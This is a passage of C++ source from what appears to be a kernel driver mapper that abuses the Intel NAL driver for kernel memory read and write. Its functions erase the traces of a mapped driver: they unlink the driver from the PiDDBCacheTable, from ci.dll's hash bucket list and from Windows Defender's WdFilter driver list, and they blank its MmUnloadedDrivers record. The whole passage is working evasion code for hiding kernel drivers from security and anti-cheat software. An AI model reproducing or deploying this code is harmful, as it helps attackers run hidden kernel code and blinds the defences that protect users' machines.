        table_offset = 2;
    }

    if (!piddb_lock_ptr || !piddb_table_ptr) {
        gsd_log::warn(L"PiDDB patterns not found.");
        return false;
    }

    uint64_t piddb_lock_addr = 0;
    uint64_t piddb_table_addr = 0;
    if (!resolve_relative_addr_kernel(piddb_lock_ptr + lock_offset, 3, 7, &piddb_lock_addr)) return false;
    int table_adjust = (table_offset == 6) ? 0 : 2; // pattern1 starts at instr, pattern2 needs +2
    if (!resolve_relative_addr_kernel(piddb_table_ptr + table_adjust, 6, 10, &piddb_table_addr)) return false;

    PVOID piddb_lock = reinterpret_cast<PVOID>(piddb_lock_addr);
    ntdefs::PRTL_AVL_TABLE piddb_table = reinterpret_cast<ntdefs::PRTL_AVL_TABLE>(piddb_table_addr);

    uint64_t fn_lock = resolve_export(ntoskrnl_base, "ExAcquireResourceExclusiveLite");
    uint64_t fn_unlock = resolve_export(ntoskrnl_base, "ExReleaseResourceLite");
    uint64_t fn_lookup = resolve_export(ntoskrnl_base, "RtlLookupElementGenericTableAvl");
    uint64_t fn_delete = resolve_export(ntoskrnl_base, "RtlDeleteElementGenericTableAvl");
    if (!fn_lock || !fn_unlock || !fn_lookup || !fn_delete) {
        gsd_log::warn(L"Failed to resolve PiDDB AVL functions.");
        return false;
    }

    BOOLEAN locked = FALSE;
    if (!call_function(fn_lock, reinterpret_cast<uint64_t*>(&locked), { reinterpret_cast<uint64_t>(piddb_lock), 1 })) {
        gsd_log::warn(L"Failed to acquire PiDDB lock.");
        return false;
    }
    if (!locked) {
        gsd_log::warn(L"PiDDB lock not acquired.");
        return false;
    }

    // Build lookup key
    auto* pe_hdr = reinterpret_cast<const IMAGE_NT_HEADERS64*>(gsd_mapper_resource::driver + reinterpret_cast<const IMAGE_DOS_HEADER*>(gsd_mapper_resource::driver)->e_lfanew);
    ULONG timestamp = pe_hdr->FileHeader.TimeDateStamp;

    ntdefs::PiDDBCacheEntry local_entry = {};
    local_entry.TimeDateStamp = timestamp;
    local_entry.DriverName.Buffer = const_cast<wchar_t*>(service_name.c_str());
    local_entry.DriverName.Length = static_cast<USHORT>(service_name.length() * sizeof(wchar_t));
    local_entry.DriverName.MaximumLength = local_entry.DriverName.Length + 2;

    PVOID pFound = nullptr;
    if (!call_function(fn_lookup, reinterpret_cast<uint64_t*>(&pFound), { reinterpret_cast<uint64_t>(piddb_table), reinterpret_cast<uint64_t>(&local_entry) })) {
        call_function(fn_unlock, nullptr, { reinterpret_cast<uint64_t>(piddb_lock) });
        gsd_log::warn(L"RtlLookupElementGenericTableAvl failed.");
        return false;
    }
    if (!pFound) {
        call_function(fn_unlock, nullptr, { reinterpret_cast<uint64_t>(piddb_lock) });
        gsd_log::warn(L"Driver not found in PiDDB cache.");
        return false;
    }

    // Unlink LIST_ENTRY
    LIST_ENTRY* prev = nullptr;
    LIST_ENTRY* next = nullptr;
    read(reinterpret_cast<uint64_t>(pFound) + offsetof(ntdefs::PiDDBCacheEntry, List.Blink), &prev, sizeof(prev));
    read(reinterpret_cast<uint64_t>(pFound) + offsetof(ntdefs::PiDDBCacheEntry, List.Flink), &next, sizeof(next));
    if (prev) write(reinterpret_cast<uint64_t>(prev) + offsetof(LIST_ENTRY, Flink), &next, sizeof(next));
    if (next) write(reinterpret_cast<uint64_t>(next) + offsetof(LIST_ENTRY, Blink), &prev, sizeof(prev));

    BOOLEAN deleted = FALSE;
    call_function(fn_delete, reinterpret_cast<uint64_t*>(&deleted), { reinterpret_cast<uint64_t>(piddb_table), reinterpret_cast<uint64_t>(pFound) });

    ULONG delCount = 0;
    read(reinterpret_cast<uint64_t>(piddb_table) + offsetof(ntdefs::RTL_AVL_TABLE, DeleteCount), &delCount, sizeof(delCount));
    if (delCount > 0) {
        delCount--;
        write(reinterpret_cast<uint64_t>(piddb_table) + offsetof(ntdefs::RTL_AVL_TABLE, DeleteCount), &delCount, sizeof(delCount));
    }

    call_function(fn_unlock, nullptr, { reinterpret_cast<uint64_t>(piddb_lock) });
    gsd_log::info(L"PiDDBCacheTable cleaned.");
    return true;
}

bool gsd::IntelNalBackend::clear_hash_bucket() {
    uint64_t ci_base = kutil::get_kernel_module_base("ci.dll");
    if (!ci_base) {
        gsd_log::warn(L"ci.dll not loaded, skipping hash bucket cleanup.");
        return true;
    }

    uint8_t mask1[] = { 0x48, 0x8B, 0x1D, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x00, 0xF7, 0x43, 0x40, 0x00, 0x20, 0x00, 0x00 };
    uint64_t sig = find_pattern_in_kernel_section("PAGE", ci_base, mask1, "xxx????x?xxxxxxx");
    if (!sig) {
        gsd_log::warn(L"g_KernelHashBucketList pattern not found.");
        return false;
    }
    uint64_t sig2 = 0;
    {
        // search backwards from sig for g_HashCacheLock
        std::vector<BYTE> scan_buf(64);
        if (read(sig - 64, scan_buf.data(), 64)) {
            sig2 = kutil::find_pattern(reinterpret_cast<uint64_t>(scan_buf.data()), 64, reinterpret_cast<const uint8_t*>("\x48\x8D\x0D"), "xxx");
            if (sig2) sig2 = (sig - 64) + (sig2 - reinterpret_cast<uint64_t>(scan_buf.data()));
        }
    }
    if (!sig2) {
        gsd_log::warn(L"g_HashCacheLock pattern not found.");
        return false;
    }

    uint64_t bucket_list_addr = 0;
    uint64_t hash_lock_addr = 0;
    if (!resolve_relative_addr_kernel(sig, 3, 7, &bucket_list_addr)) return false;
    if (!resolve_relative_addr_kernel(sig2, 3, 7, &hash_lock_addr)) return false;

    PVOID bucket_list = reinterpret_cast<PVOID>(bucket_list_addr);
    PVOID hash_lock = reinterpret_cast<PVOID>(hash_lock_addr);
    if (!bucket_list || !hash_lock) {
        gsd_log::warn(L"Failed to resolve hash bucket relative addresses.");
        return false;
    }

    uint64_t fn_lock = resolve_export(ntoskrnl_base, "ExAcquireResourceExclusiveLite");
    uint64_t fn_unlock = resolve_export(ntoskrnl_base, "ExReleaseResourceLite");
    if (!fn_lock || !fn_unlock) return false;

    BOOLEAN locked = FALSE;
    if (!call_function(fn_lock, reinterpret_cast<uint64_t*>(&locked), { reinterpret_cast<uint64_t>(hash_lock), 1 }) || !locked) {
        gsd_log::warn(L"Failed to acquire hash cache lock.");
        return false;
    }

    ntdefs::HashBucketEntry* prev = reinterpret_cast<ntdefs::HashBucketEntry*>(bucket_list);
    ntdefs::HashBucketEntry* entry = nullptr;
    read(reinterpret_cast<uint64_t>(prev), &entry, sizeof(entry));
    if (!entry) {
        call_function(fn_unlock, nullptr, { reinterpret_cast<uint64_t>(hash_lock) });
        return true;
    }

    SIZE_T expected_len = (driver_path.length() - 2) * 2; // \??\ prefix removed length in bytes
    bool found = false;
    while (entry) {
        USHORT name_len = 0;
        read(reinterpret_cast<uint64_t>(entry) + offsetof(ntdefs::HashBucketEntry, DriverName.Length), &name_len, sizeof(name_len));
        if (name_len == expected_len) {
            wchar_t* name_ptr = nullptr;
            read(reinterpret_cast<uint64_t>(entry) + offsetof(ntdefs::HashBucketEntry, DriverName.Buffer), &name_ptr, sizeof(name_ptr));
            if (name_ptr) {
                std::vector<wchar_t> name_buf(name_len / 2 + 1);
                read(reinterpret_cast<uint64_t>(name_ptr), name_buf.data(), name_len);
                std::wstring name_str(name_buf.data());
                if (name_str.find(service_name) != std::wstring::npos) {
                    ntdefs::HashBucketEntry* next = nullptr;
                    read(reinterpret_cast<uint64_t>(entry), &next, sizeof(next));
                    write(reinterpret_cast<uint64_t>(prev), &next, sizeof(next));
                    free_pool(reinterpret_cast<uint64_t>(entry));
                    found = true;
                    break;
                }
            }
        }
        prev = entry;
        if (!read(reinterpret_cast<uint64_t>(entry), &entry, sizeof(entry))) break;
    }

    call_function(fn_unlock, nullptr, { reinterpret_cast<uint64_t>(hash_lock) });
    if (found) gsd_log::info(L"HashBucketList cleaned.");
    return found;
}

bool gsd::IntelNalBackend::clear_mm_unloaded() {
    ULONG req = 0;
    NTSTATUS status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)ntdefs::SystemExtendedHandleInformation, nullptr, 0, &req);
    if (status != STATUS_INFO_LENGTH_MISMATCH) return false;

    std::vector<BYTE> buf(req);
    status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)ntdefs::SystemExtendedHandleInformation, buf.data(), req, &req);
    if (!NT_SUCCESS(status)) return false;

    auto* info = reinterpret_cast<ntdefs::PSYSTEM_HANDLE_INFORMATION_EX>(buf.data());
    uint64_t object = 0;
    for (ULONG i = 0; i < info->HandleCount; ++i) {
        auto& h = info->Handles[i];
        if (reinterpret_cast<ULONG_PTR>(h.UniqueProcessId) == GetCurrentProcessId() && h.HandleValue == hDevice) {
            object = reinterpret_cast<uint64_t>(h.Object);
            break;
        }
    }
    if (!object) {
        gsd_log::warn(L"Could not find driver object via handle enumeration.");
        return false;
    }

    uint64_t device_obj = 0;
    read(object + 0x8, &device_obj, sizeof(device_obj));
    if (!device_obj) return false;

    uint64_t driver_obj = 0;
    read(device_obj + 0x8, &driver_obj, sizeof(driver_obj));
    if (!driver_obj) return false;

    uint64_t driver_section = 0;
    read(driver_obj + 0x28, &driver_section, sizeof(driver_section));
    if (!driver_section) return false;

    UNICODE_STRING us = {};
    read(driver_section + 0x58, &us, sizeof(us));
    if (!us.Length) return false;

    auto name = std::make_unique<wchar_t[]>(us.Length / 2 + 1);
    read(reinterpret_cast<uint64_t>(us.Buffer), name.get(), us.Length);
    gsd_log::detail(L"MmUnloadedDrivers name: " + std::wstring(name.get()));

    us.Length = 0;
    write(driver_section + 0x58, &us, sizeof(us));
    gsd_log::info(L"MmUnloadedDrivers cleaned.");
    return true;
}

bool gsd::IntelNalBackend::clear_wdfilter() {
    uint64_t wd_base = kutil::get_kernel_module_base("WdFilter.sys");
    if (!wd_base) {
        gsd_log::warn(L"WdFilter.sys not loaded, skipping.");
        return true;
    }

    uint8_t m1[] = { 0x48, 0x8B, 0x0D, 0x00, 0x00, 0x00, 0x00, 0xFF, 0x05 };
    uint64_t list_ref = find_pattern_in_kernel_section("PAGE", wd_base, m1, "xxx????xx");
    if (!list_ref) {
        gsd_log::warn(L"WdFilter RuntimeDriversList pattern not found.");
        return false;
    }

    uint8_t m2[] = { 0xFF, 0x05, 0x00, 0x00, 0x00, 0x00, 0x48, 0x39, 0x11 };
    uint64_t count_ref = find_pattern_in_kernel_section("PAGE", wd_base, m2, "xx????xxx");
    if (!count_ref) {
        gsd_log::warn(L"WdFilter RuntimeDriversCount pattern not found.");
        return false;
    }

    uint8_t m3[] = { 0x89, 0x00, 0x08, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE9 };
    uint64_t free_ref = find_pattern_in_kernel_section("PAGE", wd_base, m3, "x?xx???????????x");
    int free_adj = 3;
    if (!free_ref) {
        uint8_t m3b[] = { 0x89, 0x00, 0x08, 0x00, 0x00, 0x00, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE9 };
        free_ref = find_pattern_in_kernel_section("PAGE", wd_base, m3b, "x?x???x???????????x");
        free_adj = 3;
    }
    if (!free_ref) {
        gsd_log::warn(L"WdFilter MpFreeDriverInfoEx pattern not found.");
        return false;
    }

    uint64_t runtime_list_head_addr = 0;
    uint64_t runtime_count_addr = 0;
    uint64_t mp_free_addr = 0;
    if (!resolve_relative_addr_kernel(list_ref, 3, 7, &runtime_list_head_addr)) return false;
    if (!resolve_relative_addr_kernel(count_ref, 2, 6, &runtime_count_addr)) return false;
    if (!resolve_relative_addr_kernel(free_ref + free_adj, 1, 5, &mp_free_addr)) return false;

    PVOID runtime_list_head = reinterpret_cast<PVOID>(runtime_list_head_addr);
    PVOID runtime_count = reinterpret_cast<PVOID>(runtime_count_addr);
    PVOID runtime_array = reinterpret_cast<PVOID>(reinterpret_cast<uint64_t>(runtime_count) + 0x8);
    read(reinterpret_cast<uint64_t>(runtime_array), &runtime_array, sizeof(runtime_array));
    PVOID mp_free = reinterpret_cast<PVOID>(mp_free_addr);

    if (!runtime_list_head || !runtime_count || !mp_free) {
        gsd_log::warn(L"WdFilter resolution failed.");
        return false;
    }

    auto read_list = [&](uint64_t addr) -> LIST_ENTRY* {
        LIST_ENTRY* ptr = nullptr;
        read(addr, &ptr, sizeof(ptr));
        return ptr;
    };

    for (LIST_ENTRY* ent = read_list(reinterpret_cast<uint64_t>(runtime_list_head) - offsetof(LIST_ENTRY, Flink));
         ent != runtime_list_head;
         ent = read_list(reinterpret_cast<uint64_t>(ent) + offsetof(LIST_ENTRY, Flink))) {

        UNICODE_STRING us = {};
        if (!read(reinterpret_cast<uint64_t>(ent) + 0x10, &us, sizeof(us))) continue;
        if (!us.Length || !us.Buffer) continue;

        auto name = std::make_unique<wchar_t[]>(us.Length / 2 + 1);
        if (!read(reinterpret_cast<uint64_t>(us.Buffer), name.get(), us.Length)) continue;

        if (wcsstr(name.get(), service_name.c_str())) {
            // Remove from RuntimeDriversArray
            PVOID same_index = reinterpret_cast<PVOID>(reinterpret_cast<uint64_t>(ent) - 0x10);
            for (int k = 0; k < 256; ++k) {
                PVOID val = nullptr;
                read(reinterpret_cast<uint64_t>(runtime_array) + k * 8, &val, sizeof(val));
                if (val == same_index) {
                    PVOID empty = reinterpret_cast<PVOID>(reinterpret_cast<uint64_t>(runtime_count) + 1);
                    write(reinterpret_cast<uint64_t>(runtime_array) + k * 8, &empty, sizeof(empty));
                    break;
                }
            }

            LIST_ENTRY* next = read_list(reinterpret_cast<uint64_t>(ent) + offsetof(LIST_ENTRY, Flink));
            LIST_ENTRY* prev = read_list(reinterpret_cast<uint64_t>(ent) + offsetof(LIST_ENTRY, Blink));
            write(reinterpret_cast<uint64_t>(next) + offsetof(LIST_ENTRY, Blink), &prev, sizeof(prev));
            write(reinterpret_cast<uint64_t>(prev) + offsetof(LIST_ENTRY, Flink), &next, sizeof(next));

            ULONG cur_count = 0;
            read(reinterpret_cast<uint64_t>(runtime_count), &cur_count, sizeof(cur_count));
            if (cur_count > 0) {
                cur_count--;
                write(reinterpret_cast<uint64_t>(runtime_count), &cur_count, sizeof(cur_count));
            }

            uint64_t driver_info = reinterpret_cast<uint64_t>(ent) - 0x20;
            USHORT magic = 0;
            read(driver_info, &magic, sizeof(magic));
            if (magic == 0xDA18) {
                call_function(reinterpret_cast<uint64_t>(mp_free), nullptr, { driver_info });
            } else {
                gsd_log::warn(L"WdFilter DriverInfo magic mismatch, skipping free.");
            }
            gsd_log::info(L"WdFilter driver list cleaned.");
            return true;
        }
    }
    return false;
}
